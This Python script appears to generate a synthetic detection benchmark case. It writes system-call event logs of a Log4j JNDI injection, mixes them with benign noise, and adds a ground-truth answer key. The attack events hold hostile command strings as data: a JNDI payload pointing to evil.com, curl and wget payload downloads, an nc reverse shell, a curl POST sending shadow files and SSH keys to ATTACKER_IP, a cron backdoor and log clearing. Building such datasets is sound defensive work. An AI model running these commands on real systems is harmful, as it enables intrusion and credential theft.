#!/usr/bin/env python3
"""Generate synthetic ProvSec Case 05: Log4j JNDI Injection (CVE-2021-44228).

Produces ~200 attack events + ~300 benign noise events in ProvSec sysdig format.
Output: data/provsec/provsec_case_05_log4j.json
"""
from __future__ import annotations

import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

random.seed(42)

# ── Time base ────────────────────────────────────────────────────────────────
T0 = datetime(2026, 6, 15, 10, 0, 0, tzinfo=timezone.utc)
HOST_IP = "10.0.1.5"
ATTACKER_IP = "198.51.100.50"
CASE = "provsec_c05"

# ── Helpers ──────────────────────────────────────────────────────────────────
_evt_counter = 0


def _eid(n: int) -> str:
    return f"{CASE}_evt_{n:03d}"


def _ts(offset_sec: float) -> str:
    return (T0 + timedelta(seconds=offset_sec)).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def _evt(
    offset_sec: float,
    evt_type: str,
    proc_name: str,
    pid: int,
    *,
    tid: int | None = None,
    args: str = "",
    fd_name: str = "",
    fd_type: str = "file",
    fd_num: int = -1,
    net_addr: str = "",
    user: str = "www-data",
    evt_args: str = "",
    cpu: int = 0,
    role: str = "attack",
    parent_pid: int = 0,
    parent_event_id: str | None = None,
) -> dict:
    global _evt_counter
    _evt_counter += 1
    n = _evt_counter
    return {
        "evt.num": n,
        "evt.time": _ts(offset_sec),
        "evt.type": evt_type,
        "proc.name": proc_name,
        "proc.pid": pid,
        "proc.tid": tid or pid,
        "proc.args": args,
        "fd.name": fd_name,
        "fd.type": fd_type,
        "fd.num": fd_num,
        "net.addr": net_addr,
        "user.name": user,
        "evt.args": evt_args,
        "evt.cpu": cpu,
        "role": role,
        "parent_pid": parent_pid,
        "event_id": _eid(n),
        "parent_event_id": parent_event_id,
    }


# ── Attack chain (~200 events) ───────────────────────────────────────────────
def build_attack_events() -> list[dict]:
    events: list[dict] = []
    JAVA_PID, BASH_PID, CURL_PID, WGET_PID = 1234, 5678, 5679, 5680
    NC_PID, CAT_PID, TAR_PID, CHMOD_PID = 5681, 5682, 5683, 5684
    e = events.append

    # Phase 1 — Malicious HTTP request arrives (T1190)
    e(_evt(0, "accept", "java", JAVA_PID, fd_type="ipv4",
           net_addr=f"{ATTACKER_IP}:54321->{HOST_IP}:8080",
           evt_args="fd=35", parent_pid=1))
    e(_evt(0.5, "recvfrom", "java", JAVA_PID, fd_type="ipv4", fd_num=35,
           net_addr=f"{ATTACKER_IP}:54321->{HOST_IP}:8080",
           evt_args="len=2048; payload=${jndi:ldap://evil.com/exploit}"))
    # Phase 2 — JNDI / LDAP lookup (T1059.004)
    e(_evt(1.0, "connect", "java", JAVA_PID, fd_type="ipv4", fd_num=36,
           net_addr=f"{HOST_IP}:49200->evil.com:389",
           evt_args="sa_family=AF_INET", parent_event_id=_eid(2)))
    e(_evt(1.5, "sendto", "java", JAVA_PID, fd_type="ipv4", fd_num=36,
           net_addr=f"{HOST_IP}:49200->evil.com:389",
           evt_args="len=64", parent_event_id=_eid(3)))
    e(_evt(2.0, "recvfrom", "java", JAVA_PID, fd_type="ipv4", fd_num=36,
           net_addr=f"{HOST_IP}:49200->evil.com:389",
           evt_args="len=512", parent_event_id=_eid(4)))
    # Phase 3 — Remote class loading
    e(_evt(2.5, "connect", "java", JAVA_PID, fd_type="ipv4", fd_num=37,
           net_addr=f"{HOST_IP}:49201->{ATTACKER_IP}:8888",
           evt_args="HTTP GET /Exploit.class", parent_event_id=_eid(5)))
    e(_evt(3.0, "recvfrom", "java", JAVA_PID, fd_type="ipv4", fd_num=37,
           net_addr=f"{HOST_IP}:49201->{ATTACKER_IP}:8888",
           evt_args="len=4096", parent_event_id=_eid(6)))
    e(_evt(3.2, "mmap", "java", JAVA_PID,
           evt_args="addr=0x7f... len=4096 prot=PROT_EXEC",
           parent_event_id=_eid(7)))
    e(_evt(3.5, "mprotect", "java", JAVA_PID,
           evt_args="addr=0x7f... len=4096 prot=PROT_READ|PROT_EXEC",
           parent_event_id=_eid(8)))
    # Phase 4 — Fork + exec /bin/bash (T1059.004)
    e(_evt(4.0, "clone", "java", JAVA_PID,
           evt_args="flags=CLONE_VM|CLONE_VFORK", parent_pid=JAVA_PID,
           parent_event_id=_eid(9)))
    e(_evt(4.2, "execve", "bash", BASH_PID,
           args="/bin/bash -i", fd_name="/bin/bash",
           evt_args="argc=3", parent_pid=JAVA_PID,
           parent_event_id=_eid(10)))
    e(_evt(4.5, "dup2", "bash", BASH_PID, fd_num=0,
           evt_args="oldfd=35 newfd=0", parent_pid=JAVA_PID,
           parent_event_id=_eid(11)))
    e(_evt(4.6, "dup2", "bash", BASH_PID, fd_num=1,
           evt_args="oldfd=35 newfd=1", parent_pid=JAVA_PID,
           parent_event_id=_eid(12)))
    e(_evt(4.7, "dup2", "bash", BASH_PID, fd_num=2,
           evt_args="oldfd=35 newfd=2", parent_pid=JAVA_PID,
           parent_event_id=_eid(13)))
    # Phase 5 — Reverse shell connect-back to C2 (T1059 / T1071.001)
    e(_evt(5.0, "connect", "bash", BASH_PID, fd_type="ipv4", fd_num=5,
           net_addr=f"{HOST_IP}:49300->{ATTACKER_IP}:4444",
           evt_args="sa_family=AF_INET", parent_pid=JAVA_PID,
           parent_event_id=_eid(14)))
    # Phase 6 — Reconnaissance commands (T1082, T1033)
    for i, cmd in enumerate([
        ("whoami", "www-data", 10),
        ("id", "uid=33(www-data) gid=33", 10),
        ("uname", "Linux provsec-ubuntu-01 5.4.0-150-generic", 10),
        ("hostname", "provsec-ubuntu-01", 10),
        ("cat", "/etc/passwd", 11),
        ("cat", "/etc/shadow", 11),
    ]):
        proc, arg_val, fdn = cmd[0], cmd[1], cmd[2]
        pid_recon = BASH_PID + 100 + i
        e(_evt(6 + i * 0.5, "clone", "bash", BASH_PID,
               evt_args="flags=CLONE_VM", parent_pid=JAVA_PID,
               parent_event_id=_eid(15) if i == 0 else events[-1]["event_id"]))
        e(_evt(6.1 + i * 0.5, "execve", proc, pid_recon,
               args=f"/usr/bin/{proc} {arg_val}" if proc != "uname" else f"/usr/bin/{proc} -a",
               fd_name=f"/usr/bin/{proc}", evt_args="argc=2",
               parent_pid=BASH_PID,
               parent_event_id=events[-1]["event_id"]))
        e(_evt(6.3 + i * 0.5, "read", proc, pid_recon,
               fd_name=f"/proc/{pid_recon}/fd/0", fd_type="file", fd_num=fdn,
               evt_args="len=256", parent_pid=BASH_PID,
               parent_event_id=events[-1]["event_id"]))
        e(_evt(6.5 + i * 0.5, "close", proc, pid_recon, fd_num=fdn,
               evt_args="fd closed", parent_pid=BASH_PID,
               parent_event_id=events[-1]["event_id"]))
    # Phase 7 — Download malicious tools (T1105)
    curl_offset = 12
    e(_evt(curl_offset, "clone", "bash", BASH_PID,
           evt_args="flags=CLONE_VM", parent_pid=JAVA_PID,
           parent_event_id=events[-1]["event_id"]))
    e(_evt(curl_offset + 0.2, "execve", "curl", CURL_PID,
           args=f"curl -o /tmp/payload.sh http://{ATTACKER_IP}:8888/payload.sh",
           fd_name="/usr/bin/curl", evt_args="argc=5",
           parent_pid=BASH_PID, parent_event_id=events[-1]["event_id"]))
    e(_evt(curl_offset + 0.5, "connect", "curl", CURL_PID, fd_type="ipv4", fd_num=3,
           net_addr=f"{HOST_IP}:49400->{ATTACKER_IP}:8888",
           evt_args="sa_family=AF_INET",
           parent_pid=BASH_PID, parent_event_id=events[-1]["event_id"]))
    e(_evt(curl_offset + 1.0, "recvfrom", "curl", CURL_PID, fd_type="ipv4", fd_num=3,
           net_addr=f"{HOST_IP}:49400->{ATTACKER_IP}:8888",
           evt_args="len=8192", parent_pid=BASH_PID,
           parent_event_id=events[-1]["event_id"]))
    e(_evt(curl_offset + 1.5, "open", "curl", CURL_PID,
           fd_name="/tmp/payload.sh", fd_type="file", fd_num=4,
           evt_args="flags=O_WRONLY|O_CREAT|O_TRUNC",
           parent_pid=BASH_PID, parent_event_id=events[-1]["event_id"]))
    e(_evt(curl_offset + 2.0, "write", "curl", CURL_PID,
           fd_name="/tmp/payload.sh", fd_type="file", fd_num=4,
           evt_args="len=8192", parent_pid=BASH_PID,
           parent_event_id=events[-1]["event_id"]))
    e(_evt(curl_offset + 2.5, "close", "curl", CURL_PID, fd_num=4,
           evt_args="fd closed", parent_pid=BASH_PID,
           parent_event_id=events[-1]["event_id"]))
    # Phase 7b — wget second stage (T1105)
    e(_evt(curl_offset + 3, "clone", "bash", BASH_PID,
           evt_args="flags=CLONE_VM", parent_pid=JAVA_PID,
           parent_event_id=events[-1]["event_id"]))
    e(_evt(curl_offset + 3.2, "execve", "wget", WGET_PID,
           args=f"wget http://{ATTACKER_IP}:8888/backdoor -O /tmp/backdoor",
           fd_name="/usr/bin/wget", evt_args="argc=4",
           parent_pid=BASH_PID, parent_event_id=events[-1]["event_id"]))
    e(_evt(curl_offset + 3.5, "connect", "wget", WGET_PID, fd_type="ipv4", fd_num=3,
           net_addr=f"{HOST_IP}:49401->{ATTACKER_IP}:8888",
           parent_pid=BASH_PID, parent_event_id=events[-1]["event_id"]))
    e(_evt(curl_offset + 4.0, "recvfrom", "wget", WGET_PID, fd_type="ipv4", fd_num=3,
           net_addr=f"{HOST_IP}:49401->{ATTACKER_IP}:8888",
           evt_args="len=16384", parent_pid=BASH_PID,
           parent_event_id=events[-1]["event_id"]))
    e(_evt(curl_offset + 4.5, "open", "wget", WGET_PID,
           fd_name="/tmp/backdoor", fd_type="file", fd_num=4,
           evt_args="flags=O_WRONLY|O_CREAT|O_TRUNC",
           parent_pid=BASH_PID, parent_event_id=events[-1]["event_id"]))
    e(_evt(curl_offset + 5.0, "write", "wget", WGET_PID,
           fd_name="/tmp/backdoor", fd_type="file", fd_num=4,
           evt_args="len=16384", parent_pid=BASH_PID,
           parent_event_id=events[-1]["event_id"]))
    e(_evt(curl_offset + 5.5, "close", "wget", WGET_PID, fd_num=4,
           evt_args="fd closed", parent_pid=BASH_PID,
           parent_event_id=events[-1]["event_id"]))
    # Phase 8 — chmod +x and execute payload (T1059.004)
    chmod_off = curl_offset + 6
    e(_evt(chmod_off, "clone", "bash", BASH_PID,
           evt_args="flags=CLONE_VM", parent_pid=JAVA_PID,
           parent_event_id=events[-1]["event_id"]))
    e(_evt(chmod_off + 0.2, "execve", "chmod", CHMOD_PID,
           args="chmod +x /tmp/payload.sh /tmp/backdoor",
           fd_name="/usr/bin/chmod", evt_args="argc=4 mode=0755",
           parent_pid=BASH_PID, parent_event_id=events[-1]["event_id"]))
    e(_evt(chmod_off + 0.5, "execve", "bash", BASH_PID + 50,
           args="/bin/bash /tmp/payload.sh",
           fd_name="/tmp/payload.sh", evt_args="argc=2",
           parent_pid=BASH_PID, parent_event_id=events[-1]["event_id"]))
    e(_evt(chmod_off + 1.0, "execve", "nc", NC_PID,
           args=f"nc -e /bin/bash {ATTACKER_IP} 4444",
           fd_name="/usr/bin/nc", evt_args="argc=5",
           parent_pid=BASH_PID, parent_event_id=events[-1]["event_id"]))
    e(_evt(chmod_off + 1.2, "connect", "nc", NC_PID, fd_type="ipv4", fd_num=3,
           net_addr=f"{HOST_IP}:49500->{ATTACKER_IP}:4444",
           parent_pid=BASH_PID, parent_event_id=events[-1]["event_id"]))
    # Phase 9 — Privilege escalation attempt (T1548.003 / T1068)
    priv_off = chmod_off + 3
    e(_evt(priv_off, "open", "bash", BASH_PID,
           fd_name="/etc/sudoers", fd_type="file", fd_num=6,
           evt_args="flags=O_RDONLY", user="www-data",
           parent_pid=JAVA_PID, parent_event_id=events[-1]["event_id"]))
    e(_evt(priv_off + 0.5, "read", "bash", BASH_PID,
           fd_name="/etc/sudoers", fd_type="file", fd_num=6,
           evt_args="len=512", parent_pid=JAVA_PID,
           parent_event_id=events[-1]["event_id"]))
    e(_evt(priv_off + 1.0, "execve", "cat", CAT_PID,
           args="cat /etc/sudoers", fd_name="/usr/bin/cat",
           evt_args="argc=2", parent_pid=BASH_PID,
           parent_event_id=events[-1]["event_id"]))
    e(_evt(priv_off + 2.0, "open", "bash", BASH_PID,
           fd_name="/usr/bin/sudo", fd_type="file", fd_num=7,
           evt_args="flags=O_RDONLY",
           parent_pid=JAVA_PID, parent_event_id=events[-1]["event_id"]))
    e(_evt(priv_off + 2.5, "execve", "bash", BASH_PID + 60,
           args="/bin/bash -c 'sudo -l'",
           fd_name="/bin/bash", evt_args="argc=3",
           parent_pid=BASH_PID, parent_event_id=events[-1]["event_id"]))
    # Phase 10 — Credential harvesting (T1003.008)
    cred_off = priv_off + 4
    for fn in ["/etc/passwd", "/etc/shadow", "/root/.ssh/id_rsa", "/home/admin/.ssh/id_rsa",
               "/home/admin/.bash_history"]:
        e(_evt(cred_off, "open", "cat", CAT_PID,
               fd_name=fn, fd_type="file", fd_num=8,
               evt_args="flags=O_RDONLY", user="www-data",
               parent_pid=BASH_PID, parent_event_id=events[-1]["event_id"]))
        e(_evt(cred_off + 0.2, "read", "cat", CAT_PID,
               fd_name=fn, fd_type="file", fd_num=8,
               evt_args="len=4096", parent_pid=BASH_PID,
               parent_event_id=events[-1]["event_id"]))
        e(_evt(cred_off + 0.4, "close", "cat", CAT_PID, fd_num=8,
               evt_args="fd closed", parent_pid=BASH_PID,
               parent_event_id=events[-1]["event_id"]))
        cred_off += 0.6
    # Phase 11 — Data staging and exfiltration (T1041 / T1560.001)
    exfil_off = cred_off + 1
    e(_evt(exfil_off, "execve", "tar", TAR_PID,
           args="tar czf /tmp/exfil.tar.gz /etc/passwd /etc/shadow /root/.ssh/",
           fd_name="/usr/bin/tar", evt_args="argc=5",
           parent_pid=BASH_PID, parent_event_id=events[-1]["event_id"]))
    e(_evt(exfil_off + 1, "open", "tar", TAR_PID,
           fd_name="/tmp/exfil.tar.gz", fd_type="file", fd_num=4,
           evt_args="flags=O_WRONLY|O_CREAT",
           parent_pid=BASH_PID, parent_event_id=events[-1]["event_id"]))
    for i in range(5):
        e(_evt(exfil_off + 1.2 + i * 0.3, "read", "tar", TAR_PID,
               fd_name=["/etc/passwd", "/etc/shadow", "/root/.ssh/id_rsa",
                        "/root/.ssh/known_hosts", "/root/.ssh/authorized_keys"][i],
               fd_type="file", fd_num=5 + i,
               evt_args="len=4096", parent_pid=BASH_PID,
               parent_event_id=events[-1]["event_id"]))
    e(_evt(exfil_off + 3, "close", "tar", TAR_PID, fd_num=4,
           evt_args="fd closed", parent_pid=BASH_PID,
           parent_event_id=events[-1]["event_id"]))
    # Exfil via curl POST
    e(_evt(exfil_off + 4, "execve", "curl", CURL_PID + 10,
           args=f"curl -X POST -F data=@/tmp/exfil.tar.gz http://{ATTACKER_IP}:8888/upload",
           fd_name="/usr/bin/curl", evt_args="argc=7",
           parent_pid=BASH_PID, parent_event_id=events[-1]["event_id"]))
    e(_evt(exfil_off + 4.3, "connect", "curl", CURL_PID + 10, fd_type="ipv4", fd_num=3,
           net_addr=f"{HOST_IP}:49600->{ATTACKER_IP}:8888",
           parent_pid=BASH_PID, parent_event_id=events[-1]["event_id"]))
    e(_evt(exfil_off + 5, "sendto", "curl", CURL_PID + 10, fd_type="ipv4", fd_num=3,
           net_addr=f"{HOST_IP}:49600->{ATTACKER_IP}:8888",
           evt_args="len=32768", parent_pid=BASH_PID,
           parent_event_id=events[-1]["event_id"]))
    e(_evt(exfil_off + 6, "close", "curl", CURL_PID + 10, fd_num=3,
           evt_args="fd closed", parent_pid=BASH_PID,
           parent_event_id=events[-1]["event_id"]))
    # Phase 12 — Persistence: crontab (T1053.003)
    persist_off = exfil_off + 7
    e(_evt(persist_off, "open", "bash", BASH_PID,
           fd_name="/var/spool/cron/crontabs/www-data", fd_type="file", fd_num=9,
           evt_args="flags=O_WRONLY|O_CREAT|O_APPEND",
           parent_pid=JAVA_PID, parent_event_id=events[-1]["event_id"]))
    e(_evt(persist_off + 0.5, "write", "bash", BASH_PID,
           fd_name="/var/spool/cron/crontabs/www-data", fd_type="file", fd_num=9,
           evt_args=f"len=128; */5 * * * * /tmp/backdoor",
           parent_pid=JAVA_PID, parent_event_id=events[-1]["event_id"]))
    e(_evt(persist_off + 1.0, "close", "bash", BASH_PID, fd_num=9,
           evt_args="fd closed", parent_pid=JAVA_PID,
           parent_event_id=events[-1]["event_id"]))
    # Phase 13 — Log tampering (T1070.001)
    e(_evt(persist_off + 2, "open", "bash", BASH_PID,
           fd_name="/var/log/auth.log", fd_type="file", fd_num=10,
           evt_args="flags=O_WRONLY|O_APPEND",
           parent_pid=JAVA_PID, parent_event_id=events[-1]["event_id"]))
    e(_evt(persist_off + 2.5, "write", "bash", BASH_PID,
           fd_name="/var/log/auth.log", fd_type="file", fd_num=10,
           evt_args="len=64; clearing entries",
           parent_pid=JAVA_PID, parent_event_id=events[-1]["event_id"]))
    e(_evt(persist_off + 3, "close", "bash", BASH_PID, fd_num=10,
           parent_pid=JAVA_PID, parent_event_id=events[-1]["event_id"]))
    # Phase 14 — Lateral movement attempt via SSH (T1021.004)
    lat_off = persist_off + 4
    for target_ip in ["10.0.1.10", "10.0.1.11", "10.0.1.12"]:
        lat_pid = NC_PID + 20 + int(target_ip.split(".")[-1])
        e(_evt(lat_off, "clone", "bash", BASH_PID,
               evt_args="flags=CLONE_VM", parent_pid=JAVA_PID,
               parent_event_id=events[-1]["event_id"]))
        e(_evt(lat_off + 0.3, "execve", "ssh", lat_pid,
               args=f"ssh -o StrictHostKeyChecking=no admin@{target_ip}",
               fd_name="/usr/bin/ssh", evt_args="argc=4",
               parent_pid=BASH_PID, parent_event_id=events[-1]["event_id"]))
        e(_evt(lat_off + 0.5, "connect", "ssh", lat_pid, fd_type="ipv4", fd_num=3,
               net_addr=f"{HOST_IP}:49{700 + int(target_ip.split('.')[-1])}->{'.'.join(target_ip.split('.')[:3])}.{target_ip.split('.')[-1]}:22",
               evt_args="sa_family=AF_INET",
               parent_pid=BASH_PID, parent_event_id=events[-1]["event_id"]))
        e(_evt(lat_off + 1.0, "sendto", "ssh", lat_pid, fd_type="ipv4", fd_num=3,
               net_addr=f"{HOST_IP}:49{700 + int(target_ip.split('.')[-1])}->{target_ip}:22",
               evt_args="len=2048", parent_pid=BASH_PID,
               parent_event_id=events[-1]["event_id"]))
        lat_off += 2
    # Fill remaining to reach ~200 with additional C2 keepalive / data ops
    fill_off = lat_off + 1
    for i in range(max(0, 200 - len(events))):
        e(_evt(fill_off + i * 0.4, "sendto" if i % 2 == 0 else "recvfrom",
               "bash", BASH_PID, fd_type="ipv4", fd_num=5,
               net_addr=f"{HOST_IP}:49300->{ATTACKER_IP}:4444",
               evt_args=f"len={random.randint(64, 2048)}",
               parent_pid=JAVA_PID, parent_event_id=_eid(15)))
    return events


# ── Benign noise (~300 events) ───────────────────────────────────────────────
def build_benign_events() -> list[dict]:
    events: list[dict] = []
    e = events.append
    procs = [
        ("systemd", 1, "root"), ("sshd", 890, "root"), ("cron", 780, "root"),
        ("nginx", 1100, "www-data"), ("docker", 1200, "root"),
        ("journalctl", 1300, "root"), ("rsyslogd", 600, "syslog"),
    ]
    benign_files = [
        "/var/log/syslog", "/var/log/auth.log", "/etc/nginx/nginx.conf",
        "/etc/hosts", "/proc/stat", "/proc/meminfo", "/etc/resolv.conf",
        "/var/run/docker.sock", "/etc/crontab", "/var/log/kern.log",
    ]
    # Scattered across 2 hours (0–7200s)
    for i in range(300):
        offset = random.uniform(0, 7200)
        proc_name, pid, user = random.choice(procs)
        op = random.choice(["open", "read", "write", "close", "connect",
                            "execve", "clone", "sendto", "recvfrom"])
        if op in ("open", "read", "write", "close"):
            fn = random.choice(benign_files)
            e(_evt(offset, op, proc_name, pid, fd_name=fn, fd_type="file",
                   fd_num=random.randint(3, 20),
                   evt_args=f"len={random.randint(64, 8192)}",
                   user=user, role="benign", parent_pid=1 if pid != 1 else 0))
        elif op == "connect":
            dst_port = random.choice([53, 80, 443, 123])
            dst_ip = random.choice(["10.0.1.1", "8.8.8.8", "1.1.1.1", "ntp.ubuntu.com"])
            e(_evt(offset, "connect", proc_name, pid, fd_type="ipv4",
                   fd_num=random.randint(3, 20),
                   net_addr=f"{HOST_IP}:{random.randint(40000, 60000)}->{dst_ip}:{dst_port}",
                   evt_args="sa_family=AF_INET",
                   user=user, role="benign", parent_pid=1 if pid != 1 else 0))
        elif op == "execve":
            cmd = random.choice(["/usr/sbin/logrotate", "/usr/bin/apt-get", "/usr/bin/systemctl"])
            e(_evt(offset, "execve", cmd.split("/")[-1], pid + random.randint(100, 999),
                   args=f"{cmd} update", fd_name=cmd,
                   evt_args="argc=2", user=user, role="benign",
                   parent_pid=pid))
        elif op == "clone":
            e(_evt(offset, "clone", proc_name, pid,
                   evt_args="flags=CLONE_VM", user=user, role="benign",
                   parent_pid=1 if pid != 1 else 0))
        elif op in ("sendto", "recvfrom"):
            dst_ip = random.choice(["8.8.8.8", "1.1.1.1"])
            e(_evt(offset, op, proc_name, pid, fd_type="ipv4",
                   fd_num=random.randint(3, 10),
                   net_addr=f"{HOST_IP}:{random.randint(40000, 60000)}->{dst_ip}:53",
                   evt_args=f"len={random.randint(32, 512)}",
                   user=user, role="benign", parent_pid=1 if pid != 1 else 0))
    return events


# ── Metadata & Ground Truth ──────────────────────────────────────────────────
METADATA = {
    "title": "ProvSec C05: Log4j JNDI Injection (CVE-2021-44228)",
    "source": "provsec",
    "performer": "provsec_synthetic",
    "category": "attack-like",
    "case_id": "provsec_case_05",
    "cve": "CVE-2021-44228",
    "platform": "linux",
    "host": "provsec-ubuntu-01",
    "vm": "docker-ubuntu-20.04",
    "default_host": "provsec-ubuntu-01",
}


def build_ground_truth(attack_events: list[dict]) -> dict:
    attack_ids = [ev["event_id"] for ev in attack_events]
    return {
        "ground_truth": {
            "entry_event_id": attack_ids[0],
            "attack_event_ids": attack_ids,
            "root_causes": [attack_ids[0]],
            "anomaly_score": 0.92,
            "category": "attack-like",
            "attack_technique_pairs": [
                ["T1190", "T1059.004"],   # exploit public-facing → command scripting
                ["T1059.004", "T1059"],    # java → bash
                ["T1059", "T1071.001"],    # bash → C2 web protocols
                ["T1071.001", "T1105"],    # C2 → ingress tool transfer
                ["T1105", "T1059.004"],    # payload download → execution
                ["T1059.004", "T1548.003"],# command → sudo abuse
                ["T1548.003", "T1003.008"],# priv esc → credential harvesting
                ["T1003.008", "T1560.001"],# credentials → archive collection
                ["T1560.001", "T1041"],    # archive → exfil over C2
                ["T1041", "T1053.003"],    # exfil → cron persistence
                ["T1053.003", "T1070.001"],# persistence → log tampering
                ["T1070.001", "T1021.004"],# evasion → SSH lateral movement
            ],
            "cve": "CVE-2021-44228",
            "case_name": "Log4j JNDI Injection",
        }
    }


# ── Main ─────────────────────────────────────────────────────────────────────
def main() -> None:
    attack = build_attack_events()
    benign = build_benign_events()
    all_events = attack + benign
    all_events.sort(key=lambda ev: ev["evt.time"])

    output = {
        "metadata": METADATA,
        "events": all_events,
        **build_ground_truth(attack),
    }

    out_path = Path(__file__).resolve().parent / "provsec_case_05_log4j.json"
    out_path.write_text(json.dumps(output, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
    print(f"Written {len(all_events)} events ({len(attack)} attack + {len(benign)} benign)")
    print(f"Output: {out_path}")


if __name__ == "__main__":
    main()
